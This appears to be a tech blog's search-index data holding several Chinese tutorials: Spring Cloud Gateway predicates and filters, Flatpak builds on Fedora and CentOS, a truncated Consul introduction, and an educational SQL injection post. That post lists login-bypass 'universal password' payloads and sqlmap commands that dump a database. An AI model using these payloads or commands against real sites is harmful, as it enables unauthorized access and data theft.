路由断言工厂用于根据配置的路由 header 信息进行断言匹配路由，匹配成功进行转发，否则不进行转发。 通过 Java 代码的方式，将 Header 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "header_route", r -&gt; r.header("X-Request-Id", "Peter").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Header 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: header_route uri: http://baidu.com predicates: - Header=X-Request-Id, Peter 测试结果 启动 gateway-header 应用 在 Postman 中将 X-Request-Id=Peter 添加到 Header，然后访问 http://127.0.0.1，查看是否成功跳转到百度的首页 Host 路由断言工厂Host 路由断言工厂根据配置的 Host，对请求中的 Host 进行断言处理，断言成功则进行路由转发，否则不转发。 通过 Java 代码的方式，将 Host 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "host_route", r -&gt; r.host("**.study.com").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Host 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: host_route uri: http://baidu.com predicates: - Host=**.study.com 测试结果 编辑系统的 hosts 配置文件，添加域名映射：127.0.0.1 www.study.com 启动 gateway-host 应用 访问 http://www.study.com，查看是否成功跳转到百度的首页 Method 路由断言工厂Method 路由断言工厂会根据路由信息配置的 method 对请求方法是 Get 或者 Post 等进行断言匹配，匹配成功则进行转发，否则处理失败。 通过 Java 代码的方式，将 Method 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "method_route", r -&gt; r.method("GET").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Method 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: method_route uri: http://baidu.com predicates: - Method=GET Query 路由断言工厂Query 路由断言工厂会从请求中获取两个参数，将请求中参数和 Query 断言路由中的配置进行匹配，比如 http://127.0.0.1?book=java 中的 book=java 和下面的 r.query("book","java") 配置一致，则转发成功，否则转发失败。 通过 Java 代码的方式，将 Query 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "query_route", r -&gt; r.query("book", "java").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Query 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: query_route uri: http://baidu.com predicates: - Query=book, java Path 路由断言工厂Path 路由断言工厂接收一个参数，根据 Path 定义好的规则来判断访问的 URI 是否匹配。在下述配置中，如果请求路径为 /blog/detail/，则此路由将匹配；也可以使用表达式，例如 /blog/detail/** 表示匹配 /blog/detail/ 开头的多级 URI。特别注意，下述的 URI 如果不以 / 结尾，那么转发后的 URI 为 http://baidu.com/blog/detail/；若以 / 结尾，转发后的 URI 则为 http://baidu.com/。 通过 Java 代码的方式，将 Path 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "path_route", r -&gt; r.path("/blog/detail/").uri("http://baidu.com/") ) .build(); }} 也可以在 application.yml 文件里配置 Path 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: path_route uri: http://baidu.com/ predicates: - Path=/blog/detail/ Weight 路由断言工厂Weight 路由断言工厂，在 Spring Cloud Gateway 中可以使用它对 URL 进行权重路由，只需在配置时指定分组和权重值即可。下述配置中，添加了两个针对 /test 路径转发的路由定义配置，这两个路由属于同一个权重分组，权重的分组名称为 group。最终的效果是把 /test 接口的 95% 的请求流量分发给服务的 V1 版本，把剩余 5% 的流量分发给服务的 V2 版本，具体的实战案例可参考这里的教程。 12345678910111213141516spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5 RemoteAddr 路由断言工厂RemoteAddr 路由断言工厂配置一个 IPv4 或 IPv6 网段的字符串或者 IP。当客户端的 IP 地址在网段之内或者和配置的 IP 相同，则成功转发，否则不能转发。例如 192.168.0.1/16 表示一个网段，其中 192.168.0.1 是 IP 地址，16 是子网掩码，当然也可以直接配置一个 IP。 通过 Java 代码的方式，将 RemoteAddr 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "remoteaddr_route", r -&gt; r.remoteAddr("127.0.0.1").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 RemoteAddr 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: remoteaddr_route uri: http://baidu.com predicates: - RemoteAddr=127.0.0.1 Spring Cloud Gateway 的内置 FilterSpring Cloud Gateway 中内置很多的路由过滤工厂，当然也可以根据实际应用场景的需要定制自己的路由过滤器工厂。路由过滤器允许以某种方式修改进来的 HTTP 请求或返回的 HTTP 响应。路由过滤器主要作用于需要处理的特定路由，Spring Cloud Gateway 提供了很多种的过滤器工厂，过滤器的实现类将近二十多个。总得来说，可以分为七类：Header、Parameter、Path、Status、Redirect 跳转、Hytrix 熔断和 RateLimiter 限流。下面将介绍 Spring Cloud Gateway 中常用的 Filter 工厂，点击下载完整的案例代码。 AddRequestHeader 过滤器AddRequestHeader 过滤器工厂用于对匹配上的请求加上 Header： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_header_route", r -&gt; r.path("/addRequestHeader") .filters(f -&gt; f.addRequestHeader("X-Request-Id", "Peter")) .uri("http://127.0.0.1:8080/addRequestHeader/") ).build(); }} AddRequestParameter 过滤器AddRequestParameter 过滤器作用是对匹配上的请求添加请求参数： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_parameter_route", r -&gt; r.path("/addRequestParameter") .filters(f -&gt; f.addRequestParameter("book", "java")) .uri("http://127.0.0.1:8080/addRequestParameter/") ).build(); }} RewritePath 过滤器Spring Cloud Gateway 可以使用 RewritePath 替换 Zuul 的 StripPrefix 功能，而且功能更强大。在 Zuul 中使用如下配置后，所有 /example/xxxx 的请求会转发给 http://example.com/xxxx，同时去除掉了 example 前缀。 123456zuul: routes: example: path: /example/** stripPrefix: true uri: http://example.com Spring Cloud Gateway 实现了类似的功能，使用的是 RewritePath 过滤器工厂。特别注意，下述的 URI 是不以 / 结尾的，否则仅仅会直接跳转到 http://baidu.com。 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("rewrite_path_route", r -&gt; r.path("/foo/**") .filters(f -&gt; f.rewritePath("/foo/(?&lt;segment&gt;.*)", "/$\\\\{segment}")) .uri("http://www.baidu.com") ).build(); }} 启动对应的应用后，访问 http://127.0.0.1:9092/foo/cache/sethelp/help.html，路由会转发到 http://www.baidu.com/cache/sethelp/help.html，这里相当于把 foo 前缀去掉。 AddResponseHeader 过滤器AddResponseHeader 过滤器工厂的作用是对从网关返回的响应添加 Header： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_response_header_route", r -&gt; r.path("/addResponseHeader") .filters(f -&gt; f.addResponseHeader("X-Request-Id", "Peter")) .uri("http://www.baidu.com/") ).build(); }} StripPrefix 过滤器StripPrefixGatewayFilterFactory 是一个对针对请求 URL 前缀进行处理的 Filter 工厂，用于去除前缀，而 PrefixPathGatewayFilterFactory 是用于增加前缀。下述的配置，访问 http://127.0.0.1:9093/baidu/test，会跳转到 https://www.baidu.com，即去除了前缀 /baidu/test/。 123456789101112spring: application: name: gateway-server cloud: gateway: routes: - id: baidu_route uri: http://www.baidu.com predicates: - Path=/baidu/test/** filters: - StripPrefix=2 Retry 过滤器网关作为所有请求流量的入口，网关对路由进行协议适配和协议转发处理的过程中，如果出现异常或网络抖动，为了保证后端服务请求的高可用，一般处理方式会对网络请求进行重试，接口必须需要做幂等处理。config.setRetries(2).setStatuses(HttpStatus.INTERNAL_SERVER_ERROR) 表示设置重试次数为两次，当服务调用失败时设置返回的状态码为 500，即服务器内部错误。 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("retry_route", r -&gt; r.path("/test/retry") .filters(f -&gt; f.retry(config -&gt; config.setRetries(2) .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR))) .uri("http://127.0.0.1:8080/retry?key=abc&amp;count=2")) .build(); }} Hystrix 过滤器Hystrix 可以提供熔断、服务降级和快速失败等功能。Spring Cloud Gateway 对 Hystrix 进行集成提供路由层面的服务熔断和降级，最简单的使用场景是当通过 Spring Cloud Gateway 调用后端服务，后端服务一直出现异常、服务不可用的状态。此时为了提高用户体验，就需要对服务降级，返回友好的提示信息给服务消费者，在保护网关自身可用的同时保护后端服务高可用。下面将给出配置示例，由于篇幅有限，只列出核心的配置内容和代码。 工程里的 pom.xml 配置文件，引入 spring-cloud-starter-gateway、spring-cloud-starter-netflix-hystrix： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; 工程里的启动主类： 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 工程里的 Fallback 控制器： 12345678@RestControllerpublic class FallbackController { @GetMapping("/fallback") public String fallback() { return "Spring Cloud Gateway Fallback！"; }} 工程里的 application.xml 配置文件，添加 Hystrix 过滤器相关的配置，并设置 Hystrix 的 fallbackcmd 的超时时间： 1234567891011121314151617181920212223spring: application: name: gateway-server cloud: gateway: routes: - id: hystrix_route predicates: - Path=/test/hystrix filters: - name: Hystrix # Hystrix Filter 的名称 args: # Hystrix 配置参数 name: fallbackcmd # HystrixCommand 的名字 fallbackUri: forward:/fallback # fallback 对应的 uri uri: http://127.0.0.1:8080/hystrix?isSleep=falsehystrix: command: fallbackcmd: execution: isolation: thread: timeoutInMilliseconds: 5000 # Hystrix 的 fallbackcmd 的超时时间 下篇 - Gateway 入门教程（中级篇） Gateway 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Web 安全之 SQL 注入",url:"/posts/74f2b358.html",text:"SQL 注入漏洞 语言有两种类型，分别是解释型语言和编译型语言。解释型语言是一种在运行时由一个运行时组件解释语言代码并执行其中包含的指令的语言。而编译型语言是代码在生成时转换为机器指令，然后在运行时直接由使用该语言的计算机执行这些指令。在解释型语言中，如果程序与用户进行交互，用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。例如：在与用户交互的程序中，用户的输入拼接到 SQL 语句中，执行了与原定计划不同的行为，从而产生了 SQL 注入漏洞。 登录 SQL 语句：select * from admin where username = '用户输入的用户名' and password = '用户输入的密码'，此时用户输入的内容可由用户自行控制，例如可以输入 ' or 1=1 --空格 SQL 语句：select * from admin where username = '' or 1=1 -- ' and password = '用户输入的密码'，其中条件 or 1=1 永远为真，-- 注释后边的内容不再执行，因此 SQL 语句执行后会返回 admin 表中所有字段的内容 万能密码 万能密码是否有效，可以通过 Burp Suite 平台自行验证。 1234567891011121314151617181920212223242526ASP、ASPX万能密码：&nbsp;&nbsp; 1： \"or \"a\"=\"a&nbsp;&nbsp;&nbsp;2： ')or('a'='a&nbsp;&nbsp;&nbsp;3：or 1=1--&nbsp;&nbsp;&nbsp;4：'or 1=1--&nbsp;&nbsp;&nbsp;5：a'or' 1=1--&nbsp;&nbsp;&nbsp;6： \"or 1=1--&nbsp;&nbsp;&nbsp;7：'or'a'='a&nbsp;&nbsp;&nbsp;8： \"or\"=\"a'='a&nbsp;&nbsp;&nbsp;9：'or''='&nbsp;&nbsp;&nbsp;10：'or'='or'&nbsp;&nbsp;&nbsp;11: 1 or '1'='1'=1&nbsp;&nbsp;&nbsp;12: 1 or '1'='1' or 1=1&nbsp;&nbsp;&nbsp;13: 'OR 1=1%00&nbsp;&nbsp;&nbsp;14: \"or 1=1%00&nbsp;&nbsp;&nbsp;15: 'xorPHP万能密码：&nbsp;&nbsp;&nbsp;'or'='or'&nbsp;&nbsp;&nbsp;'or 1=1/*&nbsp;&nbsp;&nbsp; User: something，Password: ' OR '1'='1JSP万能密码：&nbsp;&nbsp;&nbsp;1'or'1'='1&nbsp;&nbsp;&nbsp;admin' OR 1=1/*&nbsp;&nbsp;&nbsp;User: admin Password: 1'or'1'='1 CMS SQL 注入漏洞 CMS 逻辑：index.php 是首页，具有文章列表（链接包含文章 id），articles.php 是文章详细页，其 URL 为 articles.php?id=文章id SQL 注入验证： 当文章 id 为 单引号'、and 1=1、and 1=2，若页面中出现 MySQL 的错误日志信息，或者页面不显示任何内容，则证明该页面存在 SQL 注入漏洞 SQLMap 探测命令： 1234探测数据库： sqlmap -u \"192.168.1.104:8080/cms/articles.php?id=1\" --dbs探测数据表： sqlmap -u \"192.168.1.104:8080/cms/articles.php?id=1\" -D cms --tables探测表字段： sqlmap -u \"192.168.1.104:8080/cms/articles.php?id=1\" -D cms -T articles --columns探测表字段值： sqlmap -u \"192.168.1.104:8080/cms/articles.php?id=1\" -D cms -T articles -C id,title,content --dump var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"网络安全"},{title:"Fedora30 构建 Flatpak 应用",url:"/posts/5bd408ba.html",text:'系统环境 12Fedora release 30 (Thirty)Linux Fedora30 3.10.0-1062.1.1.el7.x86_64 #1 SMP Fri Sep 13 22:55:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Flatpak 安装 12345678910111213# 安装flatpak# yum install flatpak flatpak-builder# 添加flathub仓库# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# 添加GNOME稳定版的仓库（已失效）# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# 添加GNOME每日构建版的仓库（最新）# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo 构建 Peek Peek 是一款 AUR 上人气很高的屏幕录像工具，可保存录像为 gif 动图和兼容于 html5 的 webm 视频，可以运行在 GNOME 桌面环境下。Peek 官方提供的源码里，默认包含了构建 Flatpak 应用的 YAML 文件，直接执行构建操作即可。构建 Peek 之前，需要保证 Flatpak 的版本 &gt;= 1.4.0，如果系统的 Flatpak 版本不满足要求，同时又不能升级 Flatpak 的版本，那么可参考本文最后给出的解决方案。 1234567891011121314151617181920212223242526# 查看flatpak的版本# flatpak --version# 下载源码# wget -O peek-1.4.0.tar.gz https://github.com/phw/peek/archive/1.4.0.tar.gz# 解压文件# tar -xvf peek-1.4.0.tar.gz# 进入构建目录# cd peek-1.4.0/data/flatpak/# 删除旧的应用文件# rm -rf *.flatpak# 安装运行时依赖gnome-platform-3.34（耗时较长），依赖flatpak的版本 &gt;= 1.4.0# flatpak install org.gnome.Sdk/x86_64/3.34# flatpak install org.gnome.Platform-3.34# 执行构建脚本# ./build.sh# 成功构建应用后，默认会生成".flatpakref"后缀的文件，例如：peek-stable.flatpakref# 安装构建生成应用# flatpak install xxxx.flatpakref 构建 Peek 的 YAML 文件 构建 Flatpak 应用离不开 YAML 配置文件，作用类似 Docker 的 docker-file，如果想自定义 Peek 的构建过程，可以参考下面 YAML 配置文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127app-id: com.uploadedlobster.peekruntime: org.gnome.Platformruntime-version: \'3.34\'sdk: org.gnome.Sdksdk-extensions: - org.freedesktop.Sdk.Extension.rust-stablebranch: stablecommand: peekfinish-args: - --share=ipc - --socket=x11 - --env=GDK_BACKEND=x11 - --socket=wayland - --talk-name=org.freedesktop.FileManager1 - --talk-name=org.gnome.Shell.Screencast - --filesystem=home - --filesystem=xdg-run/dconf - --filesystem=~/.config/dconf:ro - --talk-name=ca.desrt.dconf - --env=DCONF_USER_CONFIG_DIR=.config/dconf - --env=LD_LIBRARY_PATH=/app/libbuild-options: cflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 cxxflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 ldflags: -fstack-protector-strong -Wl,-z,relro,-z,now append-path: /usr/lib/sdk/rust-stable/bincleanup: - /include - /lib/pkgconfig - /share/gtk-doc - "*.la"modules: - name: ffmpeg config-opts: - --disable-debug - --disable-static - --enable-gpl - --enable-libvpx - --enable-libx264 - --enable-shared - --enable-libxcb - --enable-libxcb-xfixes - --disable-libxcb-shape - --disable-ffplay - --disable-ffprobe - --disable-doc - --disable-everything - --enable-bsf=vp9_superframe - --enable-decoder=libvpx_vp9 - --enable-decoder=png - --enable-decoder=rawvideo - --enable-encoder=apng - --enable-encoder=ffvhuff - --enable-encoder=gif - --enable-encoder=libvpx_vp9 - --enable-encoder=libx264 - --enable-encoder=png - --enable-demuxer=image2 - --enable-demuxer=matroska - --enable-muxer=apng - --enable-muxer=gif - --enable-muxer=image2 - --enable-muxer=mp4 - --enable-muxer=webm - --enable-filter=crop - --enable-filter=fps - --enable-filter=palettegen - --enable-filter=paletteuse - --enable-filter=scale - --enable-protocol=file - --enable-indev=xcbgrab sources: - type: archive url: https://ffmpeg.org/releases/ffmpeg-4.2.1.tar.xz sha256: cec7c87e9b60d174509e263ac4011b522385fd0775292e1670ecc1180c9bb6d4 modules: - name: yasm cleanup: "*" sources: - type: archive url: http://www.tortall.net/projects/yasm/releases/yasm-1.3.0.tar.gz sha256: 3dce6601b495f5b3d45b59f7d2492a340ee7e84b5beca17e48f862502bd5603f - name: libx264 config-opts: - --enable-pic - --enable-shared sources: - type: git url: https://git.videolan.org/git/x264.git commit: 72db437770fd1ce3961f624dd57a8e75ff65ae0b cleanup: - /bin/x264 - name: gifski buildsystem: simple build-options: build-args: - --share=network skip-arches: - aarch64 - arm sources: - type: archive url: https://github.com/ImageOptim/gifski/archive/0.9.1.tar.gz sha256: f39a6e510e825bf4b43aebd1d7fb581d3b59a11bf7521bf6f507d4b0fa684b76 build-commands: - cargo build --release --features=openmp --verbose - install -Dm755 target/release/gifski /app/bin/gifski - name: peek buildsystem: meson config-opts: - --buildtype=release build-options: cflags: -L/app/lib sources: - type: git url: ../.. branch: 1.4.0 modules: - name: keybinder3 sources: - type: archive url: https://github.com/kupferlauncher/keybinder/releases/download/keybinder-3.0-v0.3.2/keybinder-3.0-0.3.2.tar.gz sha256: e6e3de4e1f3b201814a956ab8f16dfc8a262db1937ff1eee4d855365398c6020© 2019 GitHub, Inc. 解决构建 Peek 时依赖 Flatpak 的版本必须大于 1.4.0 的问题 123# 更改YAML配置文件，指定org.gnome.Platform为其他低版本runtime: org.gnome.Platformruntime-version: \'3.32\' var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Centos7 下 Flatpak 的安装与使用",url:"/posts/61c6d2c8s.html",text:'Flatpak 介绍 Flatpak（前世为 xdg-app）是一种用于构建、分发、安装和运行应用程序的技术，类似的应用程序容器技术还有大名鼎鼎的 Snap、AppImage。它主要针对的是 Linux 桌面，通过在沙箱中隔离应用程序来提高 Linux 桌面的安全性，允许应用程序安装在任何 Linux 发行版上，而且支持用户在同一个系统中安装同一应用程序的多个版本。如果需要更多的 Flatpak 应用，可以从 Flathub 应用商店直接获取。 Flatpak 安装 12345678910111213# 安装flatpak# yum install flatpak flatpak-builder# 添加flathub仓库# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# 添加GNOME稳定版的仓库（已失效）# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# 添加GNOME每日构建版的仓库（最新）# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo Flatpak 仓库管理命令 1234567891011121314# 查看仓库列表# flatpak remotes# 删除特定的仓库# flatpak remote-delete gnome-apps# 查看所有仓库的可用软件包列表（包括应用程序和运行时环境）# flatpak remote-ls | head -20# 查看所有仓库的应用程序列表# flatpak remote-ls --app# 查看特定仓库的应用程序列表# flatpak remote-ls gnome-apps --app Flatpak 应用管理命令 12345678910111213141516171819202122232425262728293031# 从特定的仓库安装应用程序（系统级安装-SystemWide）# flatpak install flathub com.leinardi.gwe# 从特定的仓库安装应用程序（用户级安装-PerUser）# flatpak install --user flathub com.leinardi.gwe# 运行已安装的应用程序# flatpak run com.leinardi.gwe# 查看已安装应用程序的详细信息# flatpak info com.leinardi.gwe# 查看已安装的软件包列表（包括应用程序和运行时环境）# flatpak list# 查看已安装的应用程序# flatpak list --app# 更新所有已安装的应用程序# flatpak update# 更新特定已安装的应用程序# flatpak update com.leinardi.gwe# 卸载特定的应用程序# flatpak uninstall com.leinardi.gwe# 离线安装（从Flathub下载应用程序的安装包，然后在本地离线安装，前提是系统已安装（或已包含）该应用程序所需的运行时环境）# flatpak install com.leinardi.gwe.flatpak# 提示：flatpak的命令，大多数都支持"--user"与"--system"参数，前者代表用户级的操作，后者代表系统级的操作，默认值为"--system" (adsbygoogle = window.adsbygoogle || []).push({}); Flatpak 配置代理 若 Flatpak 的下载速度比较慢，此时可以配置 Flatpak 使用代理，以此加快下载速度。 123456# 添加环境变量# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# 测试代理# curl -I www.google.com 123# 移除环境变量# unset http_proxy# unset https_proxy Flatpak 相关目录说明 121. 普通用户运行Flatpak应用后自动生成的缓存目录为：~/.var/app2. 系统级安装Flatpak应用后，其应用的安装文件所在目录为：/var/lib/flatpak/app、/var/lib/flatpak/runtime 创建 Flatpak 应用的快捷方式 123456# 正常情况下安装Flatpak应用后，会自动创建快捷方式，如果没有则可以使用以下方法手动创建快捷方式# 创建应用com.leinardi.gwe（系统级安装）的快捷方式# ln -s /var/lib/flatpak/app/com.leinardi.gwe/x86_64/stable/fd76222820472b18cf6d6733e8549da7b25f14266cde1d4ba7d6975f983db7f8/files/share/applications/com.leinardi.gwe.desktop /usr/share/applications/gwe.desktop# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; GreenWithEnvy，直接点击快捷方式启动应用 Deepin-Wine 安装 Deepin（深度）默认支持 Flatpak，因此可以通过 Flatpak 安装 Deepin 构建打包好的 Flatpak 应用。首先使用 Flatpak 安装 Deepin-Wine 容器，然后就可以安装 Deepin 官方提供的 TIM、微信、迅雷等常用应用了。实测虽然部分应用可以安装并使用，但实际使用起来不太稳定。具体安装步骤可参考：flatpak-deepinwine-gitee、Deepin-Wine 环境的 Ubuntu/Debian 移植版 参考博客 Flatpak 软件包新手指南 Linux 安装模式 AppImage,Flatpak,Snap 整理 真有用？Snap 和 Flatpak 通吃所有发行版的打包方式 三款新星 Linux 解决方案：Snappy、Flatpak 和 AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Consul 入门教程 - 基础篇",url:"/posts/29fe9682.html",text:'Consul 介绍Consul 是什么作为集群系统的灵魂，服务治理框架一直都受架构师的青睐。随着微服务思想的普及，越来越多的服务治理框架如雨后春笋般冒了出来。除了 Eureka，HashiCorp 公司的 Consul 也让诸多架构师青睐有加。Consul 是一个分布式高可用的服务网格（service mesh）解决方案，提供包括服务发现、配置和分段功能在内的全功能控制平面。这些功能中的每一个都可以根据需要单独使用，也可以一起使用以构建完整的服务网格。简单来说，Consul 是一个分布式高可用的系统服务发现与配置工具，它跟 Eureka 的核心功能一样，但略有不同： Consul 使用 Go 语言编写，以 HTTP 方式对外提供服务 Consul 支持多数据中心，这是它的一大特色 Consul 提供了可视化的 Web 界面 Consul 的一致性协议是 CP（Raft） Consul 除了服务发现之外，还有一些别的功能，例如配置功能 Consul 的主要功能Consul 提供了以服务治理为核心的多种功能以满足分布式系统的需要，它可以作为服务治理组件和配置中心。当然，市场上还有很多其他类似功能的优秀框架，Consul 官方提供了对比信息，以便架构师们在做技术选型时可以尽快找到更适合自己的方案。Consul 的主要功能如下，更多介绍可参考：Consul 官网、Consul 项目、Consul 中文教程。 服务发现：有了 Consul，服务可以通过 DNS 或者 HTTP 直接找到它所依赖的服务 健康检查：Consul 提供了健康检查的机制，从简单的服务端是否返回 200 的响应代码到较为复杂的内存使用率是否低于 90% K/V 存储：应用程序可以根据需要使用 Consul 的 Key/Value 存储，Consul 提供了简单易用的 HTTP 接口来满足用户的动态配置、特征标记、协调、Leader 选举等需求 多数据中心：Consul 原生支持多数据中心，这意味着用户不用为了多数据中心自己做抽象 Consul 安装Consul 的安装比较简单，官方提供了二进制可执行文件，可以在官网下载自己感兴趣的版本，安装步骤如下： 将已下载的 consul_l.2.0_linux_amd64.zip 解压到 /opt/consul/ 目录下 添加 consul 到 PATH（环境变量） 执行 consul -v，如果不报错，基本就算安装成功了 Consul 启动Consul 集群默认需要至少三台 Consul 启动，当有多个 Consul 节点启动了，那么它们会自动组成集群。如果只是想本地开发调试，可以使用开发者模式启动，数据默认保存在内存中。 12# 使用开发模式，启动consul$ consul agent -dev Consul 默认是没有 UI 界面的，如果需要展示 UI 界面，可以加上 -ui 参数进行启动，然后通过 http://127.0.0.1:8500 访问 UI 界面： 1$ consul agent -dev -ui Consul 实用接口Consul 对外提供了丰富的 API，有运维人员喜欢的命令行接口，也有开发人员喜欢的 HTTP 接口，常用的接口如下： Consul 管理命令 consul members：查看当前 Consul 集群里所有成员的信息以及它们的状态：存活、离线、启动失败 consul monitor：持续打印当前 Consul 的日志信息，这个命令很有用，因为 Consul 访问量比较大，所以生产环境一般不会保存日志，如果想查看实时日志，可以使用该命令 consul leave：退出集群，一般会使用这个命令而不是直接杀掉 Consul 的进程 Consul 对外服务接口 /v1/agent/members：列出集群内的所有成员及其信息 /v1/status/leader：显示当前集群 leader /v1/catalog/services：显示当前注册的服务 /v1/kv/key：显示当前 Key 对应的 Value Spring Cloud Consul 基础Spring Cloud Consul 介绍Spring Cloud Consul 通过自动配置、对 Spring Environment 绑定和其他惯用的 Spring 模块，为 Spring Boot 应用程序提供了 Consul 集成。只需要一些简单注解，就可以快速启用和配置 Consul，并用它来构建大型分布式系统。Spring Cloud Consul 作为 Spring Cloud 与 Consul 之间的桥梁，对二者都有良好的支持，其特性如下： 服务注册发现，实例可以向 Consul 注册服务，客户端可以使用 Spring Bean 来发现服务提供方 支持 